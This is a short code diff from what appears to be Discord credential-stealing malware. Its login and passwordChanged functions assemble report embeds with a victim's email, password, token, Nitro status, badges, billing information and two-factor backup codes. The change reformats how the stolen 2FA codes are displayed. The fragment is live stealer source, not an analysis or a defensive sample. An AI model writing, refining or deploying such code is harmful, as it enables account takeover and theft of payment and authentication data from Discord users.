@@ -342,7 +342,7 @@ const login = async (email, password, token) => {
                     },
                     {
                         "name": "**Discord Info**",
-                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: [**click me!**](${mfa})`,
+                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: **${mfa}**`,
                         "inline": false
                     }, 
                     {
@@ -385,7 +385,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
                     },
                     {
                         "name": "**Discord Info**",
-                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: [**click me!**](${mfa})`,
+                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: **${mfa}**`,
                         "inline": true
                     },
                     {
